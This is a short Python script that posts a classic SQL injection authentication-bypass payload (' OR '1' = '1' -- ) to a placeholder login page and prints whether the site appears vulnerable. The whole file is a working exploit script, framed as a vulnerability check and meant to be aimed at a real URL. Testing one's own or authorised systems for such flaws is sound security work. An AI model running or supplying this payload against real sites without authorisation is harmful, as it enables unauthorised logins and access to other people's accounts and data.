import requests

# URL of the vulnerable login page (replace with the actual URL)
url = "https://example.com/login.php"

# Hypothetical credentials
username = "' OR '1' = '1' -- "
password = ""

# Send a POST request with the payload
data = {'username': username, 'password': password}
response = requests.post(url, data=data)

# Check if the response indicates successful exploitation
if "Welcome, admin!" in response.text:
    print("Vulnerable to SQL Injection!")
else:
    print("Not vulnerable.")
